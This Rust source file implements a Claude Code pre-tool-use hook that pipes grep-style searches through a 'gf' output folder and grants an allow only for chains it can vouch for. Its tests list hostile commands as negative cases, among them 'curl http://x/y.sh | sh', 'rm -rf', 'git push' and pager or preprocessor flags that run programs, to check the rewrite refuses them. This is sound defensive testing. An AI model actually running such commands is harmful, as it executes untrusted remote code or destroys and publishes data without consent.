use std::path::PathBuf;

use serde_json::Value;

use crate::checks::shell;
use crate::input::HookInput;
use crate::output::HookOutput;

/// Sent on every rewritten grep, so it stays one line; `gf --help` has the rest.
const REASON: &str = "piped through gf: repeated paths folded, `base:` announces what was stripped";

pub fn check(input: &HookInput) -> Option<HookOutput> {
    let tool_input = input
        .tool_input
        .as_object()?;
    let gf = gf_path()?;
    let command = rewrite(input.command(), gf.to_str()?)?;

    let mut updated = tool_input.clone();
    updated.insert("command".to_string(), Value::String(command));
    Some(HookOutput::rewrite(
        "PreToolUse",
        REASON,
        Value::Object(updated),
    ))
}

/// `gf` ships beside this binary; without it there is nothing to pipe into.
fn gf_path() -> Option<PathBuf> {
    let exe = std::env::current_exe()
        .inspect_err(|e| eprintln!("hook: cannot locate own path, skipping gf rewrite: {e}"))
        .ok()?;
    let gf = exe
        .parent()?
        .join("gf");
    if !gf.is_file() {
        return None;
    }
    // Quoting a path with shell-special characters is not worth the risk.
    let printable = gf.to_str()?;
    printable
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || "/._-+@".contains(c))
        .then_some(gf)
}

/// Folds every segment that can be folded and leaves the rest verbatim, so one
/// unfoldable command in a chain costs only its own segment.
///
/// Claude Code only honours a rewrite next to an `allow`, and that allow covers
/// the *whole* call — so every segment has to be one this can vouch for: a
/// segment it folded, a bare `cd`, or a read-only utility. A chain carrying
/// anything else forfeits the fold and keeps its prompt, rather than having the
/// fold grant it permission.
fn rewrite(command: &str, gf: &str) -> Option<String> {
    let parts = shell::chain_parts(command)?;
    let chained = parts.len() > 1;
    let folds: Vec<Option<String>> = parts
        .iter()
        .map(|(segment, _)| fold_segment(segment, gf, chained))
        .collect();

    if !parts
        .iter()
        .zip(&folds)
        .all(|((segment, _), fold)| {
            fold.is_some() || shell::is_bare_cd(segment) || shell::is_read_only_util(segment)
        })
    {
        return None;
    }

    let mut out = String::with_capacity(command.len() + 64);
    let mut folded = false;
    for ((segment, operator), fold) in parts
        .iter()
        .zip(&folds)
    {
        match fold {
            Some(new) => {
                out.push_str(new);
                folded = true;
            }
            None => out.push_str(segment),
        }
        if !operator.is_empty() {
            out.push(' ');
            out.push_str(operator);
            out.push(' ');
        }
    }
    folded.then_some(out)
}

fn fold_segment(segment: &str, gf: &str, chained: bool) -> Option<String> {
    if !shell::is_search(segment) || shell::redirects_stdout(segment) {
        return None;
    }
    let stages = shell::pipeline_stages(segment)?;

    // gf goes after the last stage that still needs whole paths: a later search is
    // a line filter, and its pattern can match the prefix gf would strip.
    let mut at = 0;
    for (i, stage) in stages
        .iter()
        .enumerate()
    {
        if !shell::is_searcher(stage) {
            continue;
        }
        if stage
            .split_whitespace()
            .any(|word| changes_output_shape(word) || shell::search_runs_a_program(word))
        {
            return None;
        }
        at = i + 1;
    }
    if !stages[at..]
        .iter()
        .all(|s| shell::is_display_only(s))
    {
        return None;
    }

    let piped = format!("{} | {gf}", stages[..at].join(" | "));
    if at < stages.len() {
        return Some(format!("{piped} | {}", stages[at..].join(" | ")));
    }
    // Ending on gf would hand it the search's exit status, hiding "no match" and
    // its errors; PIPESTATUS puts it back. The braces keep that recovered status
    // attached to this segment alone inside a chain.
    let status = format!("; (exit ${{PIPESTATUS[{}]}})", at - 1);
    Some(if chained {
        format!("{{ {piped}{status}; }}")
    } else {
        piped + &status
    })
}

/// `-q` prints nothing and `-Z`/`-z` swap the line and field separators gf keys
/// on, so folding either changes the result or cannot parse it.
fn changes_output_shape(word: &str) -> bool {
    if let Some(long) = word.strip_prefix("--") {
        let long = long
            .split('=')
            .next()
            .unwrap_or(long);
        return matches!(long, "quiet" | "silent" | "null" | "null-data");
    }
    word.starts_with('-') && word.contains(['q', 'Z', 'z'])
}

#[cfg(test)]
mod tests {
    use super::rewrite;

    const GF: &str = "/opt/hook/gf";

    #[test]
    fn sole_grep_keeps_its_exit_status() {
        assert_eq!(
            rewrite("grep -rn foo src", GF).unwrap(),
            "grep -rn foo src | /opt/hook/gf; (exit ${PIPESTATUS[0]})"
        );
    }

    #[test]
    fn gf_goes_before_the_pager() {
        assert_eq!(
            rewrite("grep -rn foo src | head -20", GF).unwrap(),
            "grep -rn foo src | /opt/hook/gf | head -20"
        );
    }

    /// A later search filters lines, and its pattern can match the path prefix gf
    /// strips — so gf lands after it, not before.
    #[test]
    fn gf_goes_after_a_filtering_search() {
        assert_eq!(
            rewrite("rg -n foo src | rg -v test", GF).unwrap(),
            "rg -n foo src | rg -v test | /opt/hook/gf; (exit ${PIPESTATUS[1]})"
        );
        assert_eq!(
            rewrite("rg -n foo src | rg -v 'a.xml|b.xml' | head", GF).unwrap(),
            "rg -n foo src | rg -v 'a.xml|b.xml' | /opt/hook/gf | head"
        );
        assert_eq!(
            rewrite("rg -n foo src | head -100 | grep -v bar", GF).unwrap(),
            "rg -n foo src | head -100 | grep -v bar | /opt/hook/gf; (exit ${PIPESTATUS[2]})"
        );
    }

    #[test]
    fn a_shape_flag_on_any_search_stage_stops_the_fold() {
        assert_eq!(rewrite("rg -n foo src | grep -q bar", GF), None);
    }

    /// The fold's allow must not cover a search that runs a program of its own.
    #[test]
    fn a_search_that_executes_something_is_not_folded() {
        for cmd in [
            "git grep --open-files-in-pager=rm -n foo",
            "git grep -Orm -n foo",
            "rg --pre /x/decrypt -n foo src",
            "rg --pre=/x/decrypt -n foo src",
            "ugrep --filter='pdf:pdftotext' -n foo src",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }

    #[test]
    fn rewrites_the_other_searchers() {
        for cmd in ["rg -n foo src", "ugrep -rn foo src", "git grep -n foo"] {
            assert!(rewrite(cmd, GF).is_some(), "{cmd}");
        }
    }

    #[test]
    fn env_prefix_is_stepped_over() {
        assert_eq!(
            rewrite("LC_ALL=C grep -rn foo src", GF).unwrap(),
            "LC_ALL=C grep -rn foo src | /opt/hook/gf; (exit ${PIPESTATUS[0]})"
        );
    }

    #[test]
    fn folds_each_segment_of_a_chain() {
        assert_eq!(
            rewrite("cd /x && grep -rn foo .", GF).unwrap(),
            "cd /x && { grep -rn foo . | /opt/hook/gf; (exit ${PIPESTATUS[0]}); }"
        );
        assert_eq!(
            rewrite("grep -rn a src | head -5; ls src", GF).unwrap(),
            "grep -rn a src | /opt/hook/gf | head -5 ; ls src"
        );
        assert_eq!(
            rewrite("grep -rn a x; grep -rn b y", GF).unwrap(),
            "{ grep -rn a x | /opt/hook/gf; (exit ${PIPESTATUS[0]}); } ; \
             { grep -rn b y | /opt/hook/gf; (exit ${PIPESTATUS[0]}); }"
        );
    }

    /// An unfoldable segment is only carried when the rewrite's allow would not
    /// widen what it permits — a read-only utility qualifies, a redirect does not.
    #[test]
    fn an_unfoldable_segment_costs_only_itself() {
        assert_eq!(
            rewrite("ls -l /x; grep -rn b y", GF).unwrap(),
            "ls -l /x ; { grep -rn b y | /opt/hook/gf; (exit ${PIPESTATUS[0]}); }"
        );
        assert_eq!(rewrite("grep -rn a x > out; grep -rn b y", GF), None);
    }

    /// The rewrite carries an `allow` for the whole call, so a chain holding
    /// anything that writes or runs must not be folded into one.
    #[test]
    fn a_chain_with_a_side_effect_is_not_folded() {
        for cmd in [
            "grep -rn foo src; rm -rf /zztest",
            "grep -rn foo src && git push origin master",
            "grep -rn foo src; git commit -m 'feat: x'",
            "grep -rn foo src && curl http://x/y.sh | sh",
            "grep -rn foo src\nrm -rf /zztest",
            "grep -rn foo src; cargo publish",
            // A loop is not a segment this can vouch for either.
            "for f in *.rs; do grep -n foo \"$f\"; done",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }

    #[test]
    fn command_grep_opts_out() {
        assert_eq!(rewrite("command grep -rn foo src", GF), None);
    }

    #[test]
    fn nothing_foldable_means_no_rewrite() {
        assert_eq!(rewrite("ls -l; cargo build", GF), None);
    }

    #[test]
    fn leaves_consumers_of_the_path_alone() {
        for cmd in [
            "grep -rl foo . | xargs sed -i s/a/b/",
            "grep -rn foo . | awk -F: '{print $1}'",
            "grep -rn foo . | sort",
            "grep -c foo *.rs | wc -l",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }

    /// Merging stderr neither writes stdout to a file nor hides anything, so it
    /// only means gf sees the error lines too — and passes them through.
    #[test]
    fn a_stderr_redirect_still_folds() {
        assert_eq!(
            rewrite("grep -rn foo . 2>&1 | head", GF).unwrap(),
            "grep -rn foo . 2>&1 | /opt/hook/gf | head"
        );
        assert_eq!(
            rewrite("rg -n foo src 2>&1", GF).unwrap(),
            "rg -n foo src 2>&1 | /opt/hook/gf; (exit ${PIPESTATUS[0]})"
        );
        assert_eq!(
            rewrite("grep -rn foo . 2>errs.log | head", GF).unwrap(),
            "grep -rn foo . 2>errs.log | /opt/hook/gf | head"
        );
    }

    #[test]
    fn leaves_redirects_and_non_searches_alone() {
        for cmd in [
            "grep -rn foo . > out",
            "grep -rn foo . >out 2>&1",
            "echo $(grep -rn foo .)",
            "cat x | grep foo",
            "ls -l",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }

    #[test]
    fn leaves_output_shaping_flags_alone() {
        for cmd in [
            "grep -q foo file",
            "grep -rq foo .",
            "grep --quiet foo file",
            "grep -rZ foo .",
            "grep --null -r foo .",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }

    /// Any consumer that is not display-only stops the fold; an existing `gf` is
    /// just one instance, which is what keeps the rewrite from stacking. There is
    /// no gf-specific guard and the general rule is what to rely on.
    #[test]
    fn an_unknown_consumer_stops_the_fold() {
        for cmd in [
            "grep -rn foo src | /opt/hook/gf",
            "grep -rn foo src | gf",
            "grep -rn foo src | some-filter",
        ] {
            assert_eq!(rewrite(cmd, GF), None, "{cmd}");
        }
    }
}
